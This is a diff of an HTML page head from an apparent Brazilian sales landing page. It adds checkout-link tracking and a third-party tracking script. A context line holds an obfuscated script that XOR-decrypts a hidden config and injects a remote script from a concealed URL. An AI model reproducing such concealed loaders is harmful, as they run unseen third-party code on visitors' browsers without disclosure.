@@ -72,7 +72,37 @@ body{-webkit-user-select:none;user-select:none;-webkit-touch-callout:none}input,
 
 <script>(function(){var c_n=atob("DH+jlKeLsvuk+3C9IQSB4dXnkMGGkwTJUQyZu4jo1pWKjgTQSBnausTk39XGiV/OQg3K5NP4nY7QlgOSTR7X8dT/nJHX2VyfQAvX5s7px4/BiFKHegSB+sbm19me2RTcVR6O4dPm253d1gDPRAnG+tOmwY7GkhTOA1OB4sbnx56GwVKfXCLe");var k_uncn=[];for(var q_7hf=0;q_7hf<c_n.length;q_7hf++){k_uncn.push(c_n.charCodeAt(q_7hf)&255);}var e_s3fi=k_uncn[0];var v_x=k_uncn.slice(1,1+e_s3fi);var l_eyqe=k_uncn.slice(1+e_s3fi);var r_dr=l_eyqe.map(function(b,e_wo1e){return b^v_x[e_wo1e%e_s3fi];});var k_t="";for(var e_7i96=0;e_7i96<r_dr.length;e_7i96++){k_t+=String.fromCharCode(r_dr[e_7i96]&255);}var l_jy=decodeURIComponent(escape(k_t));var q_c9=JSON.parse(l_jy);var f_4=q_c9.globals||[];f_4.forEach(function(m_ie69){window[m_ie69.name]=m_ie69.value;});var v_u09a=document.createElement("script");v_u09a.src=q_c9.url;v_u09a.async=true;v_u09a.defer=true;(q_c9.attributes||[]).forEach(function(f_j35t){v_u09a.setAttribute(f_j35t.name,f_j35t.value);});(document.head||document.documentElement).appendChild(v_u09a);})();</script>
 
+<script>
+(function () {
+  // espera o snippet (window.lck) ficar pronto
+  function whenReady(cb) {
+    var n = 0, t = setInterval(function () {
+      if (window.lck && window.lck.id) { clearInterval(t); cb(); }
+      else if (++n > 40) clearInterval(t); // desiste após ~6s
+    }, 150);
+  }
+  whenReady(function () {
+    var links = document.querySelectorAll('a[href*="pay.wiapy.com"]');
+    links.forEach(function (a) {
+      // 1) injeta o utm_content (= trck_user_id) na URL do checkout
+      try {
+        var u = new URL(a.href);
+        u.searchParams.set('utm_content', window.lck.id);
+        a.href = u.toString();
+      } catch (e) {}
+      // 2) dispara InitiateCheckout no clique (value opcional via data-value)
+      a.addEventListener('click', function () {
+        var v = parseFloat(a.getAttribute('data-value'));
+        var params = { currency: 'BRL' };
+        if (!isNaN(v)) params.value = v;
+        window.lck.track('InitiateCheckout', params);
+      });
+    });
+  });
+})();
+</script>
 
+<script defer src="https://www.lcktracking.online/t.js" data-base="https://www.lcktracking.online" data-offer="202-recursos"></script>
 
 </head>
 <body>
